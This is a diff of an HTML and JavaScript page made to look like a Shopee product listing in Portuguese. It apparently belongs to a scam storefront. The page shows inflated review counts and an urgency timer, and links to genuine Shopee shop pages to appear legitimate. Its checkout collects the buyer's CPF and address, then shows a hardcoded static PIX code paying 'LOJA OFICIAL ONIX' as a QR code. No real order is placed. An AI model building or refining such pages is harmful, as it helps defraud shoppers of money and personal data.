@@ -31,7 +31,7 @@
         .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
         .search-bar { flex: 1; margin: 0 12px; background: #f0f0f0; padding: 8px 35px; border-radius: 2px; font-size: 14px; border: none; outline: none; }
 
-        /* PRODUTO & BANNERS */
+        /* PRODUTO */
         .main-slider img { width: 100%; display: block; background: white; }
         .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
         .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; }
@@ -54,14 +54,18 @@
         .review-media { display: flex; gap: 6px; overflow-x: auto; margin-top: 10px; }
         .review-media video, .review-media img { width: 110px; height: 110px; object-fit: cover; border-radius: 2px; flex-shrink: 0; }
 
-        /* RODAPÉ E MODAL */
+        /* BOTÕES ESTILO SHOPEE */
+        .btn-shopee-main { background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; height: 48px; width: 100%; text-transform: uppercase; border-radius: 4px; display: block; margin-top: 15px; }
+
+        /* RODAPÉ FIXO */
         .footer-main { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
-        .btn-orange-full { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; height: 100%; text-transform: uppercase; }
+        .btn-buy-footer { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; text-transform: uppercase; }
+
+        /* MODAL */
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
         .modal-content { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 12px 12px 0 0; max-height: 92vh; overflow-y: auto; padding-bottom: 20px; }
         .modal-nav { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; }
         
-        /* FORMULÁRIO */
         .step-container { background: white; padding: 15px; margin-bottom: 8px; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; cursor: pointer; margin: 0 8px 8px 0; }
@@ -113,7 +117,7 @@
                 <p style="font-size:11px; color:#888;">Ativo há 3 minutos | São Paulo</p>
             </div>
         </div>
-        <a href="#" class="btn-visit-shop">Visitar Loja</a>
+        <a href="https://shopee.com.br/shop/1078992312" class="btn-visit-shop">Visitar Loja</a>
     </div>
 
     <div class="reviews-header">
@@ -121,7 +125,7 @@
             <p style="font-size:13px; font-weight:bold;">AVALIAÇÕES DO PRODUTO (19.566)</p>
             <div style="color:var(--shopee); font-size:11px; margin-top:3px;">⭐⭐⭐⭐⭐ 4.9/5</div>
         </div>
-        <span style="color:var(--shopee); font-size:12px;">Ver Tudo ></span>
+        <a href="https://shopee.com.br/shop/1078992312/item/23292818042/rating" style="text-decoration:none; color:var(--shopee); font-size:12px;">Ver Tudo ></a>
     </div>
 
     <div class="review-item">
@@ -140,13 +144,13 @@
             <i class="far fa-comment-dots" style="font-size:20px;"></i>
             <i class="fas fa-cart-plus" style="font-size:20px;"></i>
         </div>
-        <button class="btn-orange-full" onclick="openModal()">Compre Agora</button>
+        <button class="btn-buy-footer" onclick="openModal()">Compre Agora</button>
     </div>
 
     <div id="modal" class="modal">
         <div class="modal-content">
             <div class="modal-nav">
-                <i class="fas fa-arrow-left" onclick="prevStep()" style="color:var(--shopee); margin-right:15px;"></i>
+                <i class="fas fa-arrow-left" onclick="prevStep()" style="color:var(--shopee); margin-right:15px; cursor:pointer;"></i>
                 <span id="modal-title" style="font-weight:bold;">Selecionar Opção</span>
             </div>
 
@@ -165,7 +169,7 @@
                     <button class="opt-btn" onclick="selectVar(this, 'cor')">CINZA</button>
                     <button class="opt-btn" onclick="selectVar(this, 'cor')">IRON MAN</button>
                 </div>
-                <button class="btn-orange-full" style="margin-top:20px; border-radius:4px;" onclick="nextStep(2)">PRÓXIMO</button>
+                <button class="btn-shopee-main" onclick="nextStep(2)">Próximo</button>
             </div>
 
             <div id="step-2" class="step-container" style="display:none;">
@@ -174,11 +178,11 @@
                 <input type="tel" id="cpf" class="input-box" placeholder="CPF">
                 <div style="display:flex; gap:8px;">
                     <input type="tel" id="cep" class="input-box" placeholder="CEP">
-                    <button class="btn-orange-full" style="width:100px; height:44px; font-size:12px; border-radius:4px;" onclick="buscarCEP()">BUSCAR</button>
+                    <button class="btn-shopee-main" style="width:100px; margin-top:0; height:44px; font-size:12px;" onclick="buscarCEP()">BUSCAR</button>
                 </div>
                 <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida">
                 <input type="text" id="cidade" class="input-box" placeholder="Cidade / Estado">
-                <button class="btn-orange-full" style="border-radius:4px; margin-top:10px;" onclick="nextStep(3)">FINALIZAR COMPRA</button>
+                <button class="btn-shopee-main" onclick="nextStep(3)">Próximo</button>
             </div>
 
             <div id="step-3" class="step-container" style="display:none; text-align:center;">
@@ -189,7 +193,7 @@
                 <p style="font-weight:bold; color:var(--teal); font-size:18px;">Código PIX Gerado!</p>
                 <img id="qr-code" src="" style="width:200px; margin:20px 0;">
                 <div id="pix-copy" style="background:#f5f5f5; padding:15px; font-size:11px; word-break:break-all; border:1px dashed #ccc; margin-bottom:20px;"></div>
-                <button class="btn-orange-full" style="border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+                <button class="btn-shopee-main" onclick="copiarPix()">Copiar Código PIX</button>
             </div>
         </div>
     </div>
@@ -197,11 +201,9 @@
     <script>
         let currentStep = 1;
         let corSelecionada = "";
-        const PIX_ESTATICO = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
+        const PIX_VAL = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
 
-        function openModal() {
-            document.getElementById('modal').style.display = 'block';
-        }
+        function openModal() { document.getElementById('modal').style.display = 'block'; }
 
         function selectVar(btn, grupo) {
             document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
@@ -216,8 +218,13 @@
             document.querySelectorAll('[id^="step-"]').forEach(s => s.style.display = 'none');
             document.getElementById('step-' + n).style.display = 'block';
             currentStep = n;
-
-            if (n === 3) gerarPix();
+            
+            if (n === 1) document.getElementById('modal-title').innerText = "Selecionar Opção";
+            if (n === 2) document.getElementById('modal-title').innerText = "Informações de Envio";
+            if (n === 3) {
+                document.getElementById('modal-title').innerText = "Pagamento PIX";
+                gerarPix();
+            }
         }
 
         function prevStep() {
@@ -238,17 +245,15 @@
         }
 
         function gerarPix() {
-            // Usa a lógica de injeção dinâmica que você enviou
-            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(PIX_ESTATICO)}&color=ee4d2d`;
-            document.getElementById('pix-copy').innerText = PIX_ESTATICO;
+            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(PIX_VAL)}&color=ee4d2d`;
+            document.getElementById('pix-copy').innerText = PIX_VAL;
         }
 
         function copiarPix() {
             navigator.clipboard.writeText(document.getElementById('pix-copy').innerText);
-            alert("Código PIX copiado com sucesso!");
+            alert("Copiado!");
         }
 
-        // Timer
         let t = 5400;
         setInterval(() => {
             if (t > 0) t--;
